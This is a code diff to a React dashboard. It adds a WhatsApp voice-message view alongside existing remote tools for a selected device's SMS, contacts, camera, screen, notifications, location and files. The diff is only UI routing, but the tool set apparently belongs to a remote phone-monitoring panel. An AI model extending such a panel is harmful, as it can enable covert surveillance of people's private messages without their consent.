@@ -18,6 +18,7 @@ import ContactsView from "@/components/views/ContactsView";
 import CameraView from "@/components/views/CameraView";
 import ScreenRecordView from "@/components/views/ScreenRecordView";
 import VoiceView from "@/components/views/VoiceView";
+import WhatsAppVoiceView from "@/components/views/WhatsAppVoiceView";
 import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
 import FileManagerView from "@/components/views/FileManagerView";
@@ -68,7 +69,7 @@ interface HomeProps {
     initialTool?: string | null;
 }
 
-export type ToolType = 'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'screen' | 'notifications' | 'audio' | 'location';
+export type ToolType = 'gallery' | 'files' | 'wavoice' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'screen' | 'notifications' | 'audio' | 'location';
 
 const normalizeTool = (raw: string | null | undefined): ToolType | null => {
     if (!raw) return null;
@@ -77,7 +78,8 @@ const normalizeTool = (raw: string | null | undefined): ToolType | null => {
     if (clean === 'torch') return 'flashlight';
     if (clean === 'filemanager' || clean === 'file' || clean === 'explorer' || clean === 'files') return 'files';
     if (clean === 'screen' || clean === 'mirror' || clean === 'screenshot' || clean === 'display') return 'screen';
-    if (['gallery', 'files', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'screen', 'notifications', 'audio', 'location'].includes(clean)) {
+    if (clean === 'wavoice' || clean === 'whatsapp-voice' || clean === 'whatsappvoice' || clean === 'whatsapp' || clean === 'wa-voice') return 'wavoice';
+    if (['gallery', 'files', 'wavoice', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'screen', 'notifications', 'audio', 'location'].includes(clean)) {
         return clean as any;
     }
     return null;
@@ -2694,6 +2696,14 @@ END:VCARD`;
                     />
                 );
             }
+            case 'wavoice':
+                return (
+                    <WhatsAppVoiceView
+                        selectedDeviceId={selectedDeviceId}
+                        userUuid={userUuid}
+                        setDeleteConfirmation={setDeleteConfirmation}
+                    />
+                );
             case 'audio':
                 return (
                     <VoiceView
